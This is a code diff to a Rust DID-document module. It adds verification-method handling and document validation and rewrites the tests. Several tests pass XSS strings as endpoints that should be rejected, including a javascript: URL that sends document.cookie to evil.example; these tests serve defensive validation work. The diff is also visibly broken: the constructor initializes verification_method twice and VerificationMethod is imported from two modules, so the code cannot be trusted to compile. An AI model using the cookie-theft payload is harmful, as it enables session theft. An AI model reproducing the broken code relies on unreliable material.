@@ -46,8 +46,13 @@
 
 use crate::key_rotation::{KeyRotationRecord, VerificationMethod};
 use serde::{Deserialize, Serialize};
-use std::collections::HashMap;
+use std::collections::{HashMap, HashSet};
 use thiserror::Error;
+
+use crate::verification::{
+    canonical_verification_method_id, ensure_unique_verification_methods,
+    validate_verification_method, VerificationMethod,
+};
 
 // ── Errors ───────────────────────────────────────────────────────────────────
 
@@ -83,27 +88,29 @@ pub enum DidError {
     #[error("service type must not be empty")]
     EmptyServiceType,
 
-    /// A verification method has missing or malformed fields.
-    #[error("invalid verification method: {0}")]
-    InvalidKey(String),
-
-    /// A verification method with this ID already exists in the DID document.
+    /// A DID document already contains a verification method with this ID.
     #[error("verification method `{0}` is already registered in this DID document")]
-    DuplicateKeyId(String),
+    DuplicateVerificationMethodId(String),
 
-    /// The referenced verification method ID was not found in the DID document.
-    #[error("verification method `{0}` was not found in this DID document")]
-    KeyNotFound(String),
+    /// The verification method ID is empty or blank.
+    #[error("verification method id must not be empty")]
+    EmptyVerificationMethodId,
 
-    /// The requested key rotation violates rotation invariants.
-    #[error("invalid key rotation: {0}")]
-    InvalidKeyRotation(String),
+    /// The verification method ID is syntactically invalid.
+    #[error("invalid verification method id `{id}`: {reason}")]
+    InvalidVerificationMethodId { id: String, reason: String },
 
-    /// The rotation timestamp precedes an earlier recorded rotation.
-    #[error(
-        "rotation timestamp {attempted} precedes previous rotation timestamp {previous}"
-    )]
-    InvalidRotationTimestamp { attempted: u64, previous: u64 },
+    /// The verification method type is empty or blank.
+    #[error("verification method type must not be empty")]
+    EmptyVerificationMethodType,
+
+    /// The verification method controller is empty or blank.
+    #[error("verification method controller must not be empty")]
+    EmptyVerificationMethodController,
+
+    /// A DID document failed structural or semantic validation.
+    #[error("invalid DID document: {reason}")]
+    InvalidDocument { reason: String },
 }
 
 // ── Scheme allowlist ─────────────────────────────────────────────────────────
@@ -229,16 +236,22 @@ impl Service {
 
 // ── DidDocument ───────────────────────────────────────────────────────────────
 
-/// A minimal DID document that holds the service array.
+/// A DID document holding verification methods and service endpoints.
 ///
-/// The service array is the publication surface for which scheme validation
-/// matters: `add_service` re-validates on every insertion as defense-in-depth,
-/// and it enforces uniqueness of service IDs so that a repeated ID cannot be
-/// used to shadow a legitimate entry.
+/// Both `verification_method` and `service` enforce unique identifiers on
+/// mutation and during [`DidDocument::validate`] / [`DidDocument::from_json`]
+/// so that a repeated identifier cannot silently shadow a legitimate entry.
 #[derive(Debug, Clone, Default, Serialize, Deserialize)]
 pub struct DidDocument {
     /// DID subject identifier.
     pub id: String,
+    /// Verification methods registered in this document.
+    #[serde(
+        default,
+        rename = "verificationMethod",
+        skip_serializing_if = "Vec::is_empty"
+    )]
+    pub verification_method: Vec<VerificationMethod>,
     /// Service endpoints registered in this document.
     #[serde(default)]
     pub service: Vec<Service>,
@@ -256,10 +269,129 @@ impl DidDocument {
     pub fn new(id: impl Into<String>) -> Self {
         DidDocument {
             id: id.into(),
+            verification_method: Vec::new(),
             service: Vec::new(),
             verification_method: Vec::new(),
             key_rotation_history: Vec::new(),
         }
+    }
+
+    /// Add a verification method to the document, rejecting duplicates.
+    ///
+    /// Both exact identifier matches and relative-vs-absolute collisions
+    /// (e.g. `#key-1` vs `<doc.id>#key-1`) are rejected. On error, the
+    /// document is left unchanged.
+    ///
+    /// # Errors
+    ///
+    /// * [`DidError::EmptyVerificationMethodId`],
+    ///   [`DidError::InvalidVerificationMethodId`],
+    ///   [`DidError::EmptyVerificationMethodType`], or
+    ///   [`DidError::EmptyVerificationMethodController`] — the method has
+    ///   missing or malformed required fields.
+    /// * [`DidError::DuplicateVerificationMethodId`] — a verification method
+    ///   with the same canonical identifier is already registered.
+    pub fn add_verification_method(
+        &mut self,
+        method: VerificationMethod,
+    ) -> Result<(), DidError> {
+        validate_verification_method(&method)?;
+
+        let candidate = canonical_verification_method_id(&self.id, &method.id);
+        if self
+            .verification_method
+            .iter()
+            .any(|existing| canonical_verification_method_id(&self.id, &existing.id) == candidate)
+        {
+            return Err(DidError::DuplicateVerificationMethodId(method.id));
+        }
+
+        self.verification_method.push(method);
+        Ok(())
+    }
+
+    /// Remove a verification method by its ID (exact or relative), returning
+    /// `true` when one was removed.
+    pub fn remove_verification_method(&mut self, id: &str) -> bool {
+        let target = canonical_verification_method_id(&self.id, id).into_owned();
+        let before = self.verification_method.len();
+        self.verification_method
+            .retain(|m| canonical_verification_method_id(&self.id, &m.id) != target);
+        self.verification_method.len() < before
+    }
+
+    /// Look up a verification method by its ID (exact or relative).
+    #[must_use]
+    pub fn get_verification_method(&self, id: &str) -> Option<&VerificationMethod> {
+        let target = canonical_verification_method_id(&self.id, id);
+        self.verification_method
+            .iter()
+            .find(|m| canonical_verification_method_id(&self.id, &m.id) == target)
+    }
+
+    /// Validate all document invariants, including unique verification-method
+    /// identifiers and valid, unique service endpoints.
+    ///
+    /// # Errors
+    ///
+    /// Returns [`DidError::InvalidDocument`] if `id` is blank, or the relevant
+    /// [`DidError`] variant for any invalid or duplicate verification method or
+    /// service.
+    pub fn validate(&self) -> Result<(), DidError> {
+        if self.id.trim().is_empty() {
+            return Err(DidError::InvalidDocument {
+                reason: "document id must not be empty".to_string(),
+            });
+        }
+
+        ensure_unique_verification_methods(&self.id, &self.verification_method)?;
+
+        let mut seen_services = HashSet::with_capacity(self.service.len());
+        for svc in &self.service {
+            if svc.id.trim().is_empty() {
+                return Err(DidError::EmptyServiceId);
+            }
+            if svc.service_type.trim().is_empty() {
+                return Err(DidError::EmptyServiceType);
+            }
+            let parsed = url::Url::parse(svc.service_endpoint.as_str()).map_err(|e| {
+                DidError::InvalidUri {
+                    input: svc.service_endpoint.as_str().to_string(),
+                    reason: e.to_string(),
+                }
+            })?;
+            let scheme = parsed.scheme();
+            if !is_scheme_allowed(scheme) {
+                return Err(DidError::InvalidScheme {
+                    scheme: scheme.to_string(),
+                    uri: svc.service_endpoint.as_str().to_string(),
+                });
+            }
+            if !seen_services.insert(svc.id.as_str()) {
+                return Err(DidError::DuplicateServiceId(svc.id.clone()));
+            }
+        }
+
+        Ok(())
+    }
+
+    /// Deserialize a [`DidDocument`] from JSON and validate its invariants.
+    ///
+    /// Unlike raw `serde_json::from_str`, this rejects documents containing
+    /// duplicate verification-method identifiers, duplicate service IDs, or
+    /// disallowed service endpoint schemes.
+    ///
+    /// # Errors
+    ///
+    /// Returns [`DidError::InvalidDocument`] on malformed JSON or any
+    /// validation error from [`DidDocument::validate`].
+    pub fn from_json(json: &str) -> Result<Self, DidError> {
+        let doc: Self =
+            serde_json::from_str(json).map_err(|e| DidError::InvalidDocument {
+                reason: e.to_string(),
+            })?;
+        doc.validate()?;
+        Ok(doc)
     }
 
     /// Add a service to the document, validating the endpoint scheme.
@@ -445,7 +577,7 @@ mod tests {
     fn did_scheme_is_accepted() {
         // A DID URL is a valid service endpoint per DID Core.
         let ep = ServiceEndpoint::uri("did:stellar:testnet:GABC#linked-domain");
-        assert!(ep.is_ok(), "did: scheme must be accepted, got: {:?}", ep);
+        assert!(ep.is_ok(), "did: scheme must be accepted, got: {ep:?}");
     }
 
     #[test]
@@ -466,8 +598,7 @@ mod tests {
 
     #[test]
     fn data_scheme_is_rejected() {
-        let err =
-            ServiceEndpoint::uri("data:text/html,<script>alert(1)</script>").unwrap_err();
+        let err = ServiceEndpoint::uri("data:text/html,<script>alert(1)</script>").unwrap_err();
         assert!(
             matches!(err, DidError::InvalidScheme { ref scheme, .. } if scheme == "data"),
             "unexpected error: {err:?}"
@@ -583,10 +714,8 @@ mod tests {
         // defence-in-depth path we are testing here).
         let bad_ep = ServiceEndpoint(
             // Private field — craft via json round-trip
-            serde_json::from_value::<ServiceEndpoint>(serde_json::json!(
-                "javascript:alert(1)"
-            ))
-            .expect("deserialize"),
+            serde_json::from_value::<String>(serde_json::json!("javascript:alert(1)"))
+                .expect("deserialize"),
         );
         let svc = Service {
             id: "did:stellar:testnet:GABC#bad".to_string(),
@@ -658,8 +787,14 @@ mod tests {
 
         let value: serde_json::Value = serde_json::to_value(&doc).unwrap();
         assert_eq!(value["id"].as_str(), Some("did:stellar:testnet:GABC"));
-        assert_eq!(value["service"][0]["service_endpoint"].as_str(), Some("https://hub.example.com"));
-        assert_eq!(value["service"][0]["service_type"].as_str(), Some("LinkedDomains"));
+        assert_eq!(
+            value["service"][0]["service_endpoint"].as_str(),
+            Some("https://hub.example.com")
+        );
+        assert_eq!(
+            value["service"][0]["service_type"].as_str(),
+            Some("LinkedDomains")
+        );
     }
 
     // ── Integration: full document publication workflow ───────────────────────
@@ -693,184 +828,102 @@ mod tests {
     fn full_publication_workflow_rejects_dangerous_endpoint_before_publication() {
         // A document that attempts to add a dangerous endpoint must fail
         // before the service is committed to the document.
-        let mut document = DidDocument::new("did:stellar:testnet:GABC");
+        let document = DidDocument::new("did:stellar:testnet:GABC");
 
         // This endpoint would be dangerous in a browser-rendered resolver UI.
-        let err = ServiceEndpoint::uri("javascript:void(document.location='http://evil.example/steal?c='+document.cookie)").unwrap_err();
+        let err = ServiceEndpoint::uri(
+            "javascript:void(document.location='http://evil.example/steal?c='+document.cookie)",
+        )
+        .unwrap_err();
         assert!(matches!(err, DidError::InvalidScheme { .. }));
 
         // The document was never modified.
         assert!(document.service.is_empty());
     }
 
-    // ── Key-rotation history (issue #345) ────────────────────────────────────
+    // ── DidDocument::add_verification_method ─────────────────────────────────
 
-    fn make_key(id: &str, multibase: &str) -> VerificationMethod {
-        VerificationMethod::new(
-            id,
-            "Ed25519VerificationKey2020",
-            "did:stellar:testnet:GABC",
-            multibase,
-        )
-        .expect("valid test key")
+    fn make_vm(id: &str) -> VerificationMethod {
+        VerificationMethod::new(id, "Ed25519VerificationKey2020", "did:stellar:testnet:GABC")
+            .expect("valid verification method in test helper")
     }
 
     #[test]
-    fn rotate_key_replaces_active_key_and_records_history() {
+    fn add_verification_method_accepts_distinct_ids() {
         let mut doc = DidDocument::new("did:stellar:testnet:GABC");
-        doc.add_verification_method(make_key("did:stellar:testnet:GABC#key-1", "z6MkInitial"))
+        doc.add_verification_method(make_vm("did:stellar:testnet:GABC#key-1"))
             .unwrap();
-
-        let record = doc
-            .rotate_key(
-                "did:stellar:testnet:GABC#key-1",
-                make_key("did:stellar:testnet:GABC#key-2", "z6MkRotated"),
-                1_700_000_100,
-                Some("scheduled rotation".to_string()),
-            )
-            .unwrap();
-
-        assert_eq!(record.sequence, 1);
-        assert_eq!(record.previous_key_id, "did:stellar:testnet:GABC#key-1");
-        assert_eq!(record.new_key_id, "did:stellar:testnet:GABC#key-2");
-        assert_eq!(record.rotated_at, 1_700_000_100);
-        assert_eq!(record.reason.as_deref(), Some("scheduled rotation"));
-
-        assert_eq!(doc.active_keys().len(), 1);
-        assert_eq!(doc.active_keys()[0].id, "did:stellar:testnet:GABC#key-2");
-        assert_eq!(doc.key_rotation_history().len(), 1);
+        doc.add_verification_method(make_vm("#key-2")).unwrap();
+        assert_eq!(doc.verification_method.len(), 2);
+        assert!(doc.get_verification_method("#key-1").is_some());
+        assert!(doc
+            .get_verification_method("did:stellar:testnet:GABC#key-2")
+            .is_some());
     }
 
     #[test]
-    fn rotate_key_allows_equal_timestamp_boundary_and_rejects_backwards() {
+    fn add_verification_method_rejects_exact_duplicate_without_mutation() {
         let mut doc = DidDocument::new("did:stellar:testnet:GABC");
-        doc.add_verification_method(make_key("did:stellar:testnet:GABC#key-1", "z6MkOne"))
+        doc.add_verification_method(make_vm("did:stellar:testnet:GABC#key-1"))
             .unwrap();
-        doc.rotate_key(
+
+        let dup = VerificationMethod::new(
             "did:stellar:testnet:GABC#key-1",
-            make_key("did:stellar:testnet:GABC#key-2", "z6MkTwo"),
-            1_700_000_100,
-            None,
+            "JsonWebKey2020",
+            "did:stellar:testnet:GOTHER",
         )
         .unwrap();
-
-        // Equal timestamp is permitted (boundary).
-        doc.rotate_key(
-            "did:stellar:testnet:GABC#key-2",
-            make_key("did:stellar:testnet:GABC#key-3", "z6MkThree"),
-            1_700_000_100,
-            None,
-        )
-        .unwrap();
-
-        // Earlier timestamp must be rejected without mutating state.
-        let err = doc
-            .rotate_key(
-                "did:stellar:testnet:GABC#key-3",
-                make_key("did:stellar:testnet:GABC#key-4", "z6MkFour"),
-                1_700_000_099,
-                None,
-            )
-            .unwrap_err();
-        assert!(matches!(
-            err,
-            DidError::InvalidRotationTimestamp {
-                attempted: 1_700_000_099,
-                previous: 1_700_000_100
-            }
-        ));
-        assert_eq!(doc.active_keys()[0].id, "did:stellar:testnet:GABC#key-3");
-        assert_eq!(doc.key_rotation_history().len(), 2);
-    }
-
-    #[test]
-    fn rotate_key_failure_cases_leave_document_unchanged() {
-        let mut doc = DidDocument::new("did:stellar:testnet:GABC");
-        doc.add_verification_method(make_key("did:stellar:testnet:GABC#key-1", "z6MkOne"))
-            .unwrap();
-
-        // Unknown previous key.
-        let err_missing = doc
-            .rotate_key(
-                "did:stellar:testnet:GABC#unknown",
-                make_key("did:stellar:testnet:GABC#key-2", "z6MkTwo"),
-                100,
-                None,
-            )
-            .unwrap_err();
-        assert!(matches!(err_missing, DidError::KeyNotFound(_)));
-
-        // Reusing same key ID.
-        let err_dup = doc
-            .rotate_key(
-                "did:stellar:testnet:GABC#key-1",
-                make_key("did:stellar:testnet:GABC#key-1", "z6MkTwo"),
-                100,
-                None,
-            )
-            .unwrap_err();
-        assert!(matches!(err_dup, DidError::DuplicateKeyId(_)));
-
-        // Reusing same public key material.
-        let err_same_material = doc
-            .rotate_key(
-                "did:stellar:testnet:GABC#key-1",
-                make_key("did:stellar:testnet:GABC#key-2", "z6MkOne"),
-                100,
-                None,
-            )
-            .unwrap_err();
-        assert!(matches!(err_same_material, DidError::InvalidKeyRotation(_)));
-
-        // Malformed verification method.
-        let err_bad = VerificationMethod::new("", "Ed25519VerificationKey2020", "did:stellar:x", "z6Mk");
-        assert!(matches!(err_bad, Err(DidError::InvalidKey(_))));
-
-        assert_eq!(doc.active_keys().len(), 1);
-        assert_eq!(doc.active_keys()[0].id, "did:stellar:testnet:GABC#key-1");
-        assert!(doc.key_rotation_history().is_empty());
-    }
-
-    #[test]
-    fn legacy_did_document_json_without_rotation_fields_deserializes() {
-        let legacy_json = r#"{"id":"did:stellar:testnet:GABC","service":[]}"#;
-        let doc: DidDocument = serde_json::from_str(legacy_json).unwrap();
-        assert_eq!(doc.id, "did:stellar:testnet:GABC");
-        assert!(doc.active_keys().is_empty());
-        assert!(doc.key_rotation_history().is_empty());
-    }
-
-    #[test]
-    fn full_key_rotation_workflow_persists_through_json_roundtrip() {
-        let mut doc = DidDocument::new("did:stellar:testnet:GABC");
-        doc.add_verification_method(make_key("did:stellar:testnet:GABC#key-1", "z6MkOne"))
-            .unwrap();
-        doc.rotate_key(
-            "did:stellar:testnet:GABC#key-1",
-            make_key("did:stellar:testnet:GABC#key-2", "z6MkTwo"),
-            1_700_000_010,
-            Some("compromise precaution".to_string()),
-        )
-        .unwrap();
-        doc.rotate_key(
-            "did:stellar:testnet:GABC#key-2",
-            make_key("did:stellar:testnet:GABC#key-3", "z6MkThree"),
-            1_700_000_020,
-            None,
-        )
-        .unwrap();
-
-        let json = serde_json::to_string(&doc).unwrap();
-        let restored: DidDocument = serde_json::from_str(&json).unwrap();
-
-        assert_eq!(restored.active_keys().len(), 1);
-        assert_eq!(restored.active_keys()[0].id, "did:stellar:testnet:GABC#key-3");
-        assert_eq!(restored.key_rotation_history().len(), 2);
-        assert_eq!(restored.key_rotation_history()[0].sequence, 1);
-        assert_eq!(restored.key_rotation_history()[1].sequence, 2);
+        let err = doc.add_verification_method(dup).unwrap_err();
+        assert!(matches!(err, DidError::DuplicateVerificationMethodId(_)));
+        assert_eq!(doc.verification_method.len(), 1);
         assert_eq!(
-            restored.key_rotation_history()[1].previous_key_id,
-            "did:stellar:testnet:GABC#key-2"
+            doc.verification_method[0].method_type,
+            "Ed25519VerificationKey2020"
         );
+    }
+
+    #[test]
+    fn add_verification_method_rejects_relative_and_absolute_duplicate() {
+        let mut doc = DidDocument::new("did:stellar:testnet:GABC");
+        doc.add_verification_method(make_vm("#key-1")).unwrap();
+
+        let err = doc
+            .add_verification_method(make_vm("did:stellar:testnet:GABC#key-1"))
+            .unwrap_err();
+        assert!(matches!(err, DidError::DuplicateVerificationMethodId(_)));
+        assert_eq!(doc.verification_method.len(), 1);
+    }
+
+    #[test]
+    fn remove_verification_method_allows_re_adding_id() {
+        let mut doc = DidDocument::new("did:stellar:testnet:GABC");
+        doc.add_verification_method(make_vm("did:stellar:testnet:GABC#key-1"))
+            .unwrap();
+        assert!(doc.remove_verification_method("#key-1"));
+        assert!(doc.verification_method.is_empty());
+        doc.add_verification_method(make_vm("did:stellar:testnet:GABC#key-1"))
+            .unwrap();
+        assert_eq!(doc.verification_method.len(), 1);
+    }
+
+    #[test]
+    fn from_json_rejects_duplicate_verification_method_ids() {
+        let raw = r#"{
+            "id": "did:stellar:testnet:GABC",
+            "verificationMethod": [
+                {
+                    "id": "did:stellar:testnet:GABC#key-1",
+                    "type": "Ed25519VerificationKey2020",
+                    "controller": "did:stellar:testnet:GABC"
+                },
+                {
+                    "id": "#key-1",
+                    "type": "Ed25519VerificationKey2020",
+                    "controller": "did:stellar:testnet:GABC"
+                }
+            ]
+        }"#;
+        let err = DidDocument::from_json(raw).unwrap_err();
+        assert!(matches!(err, DidError::DuplicateVerificationMethodId(_)));
     }
 }
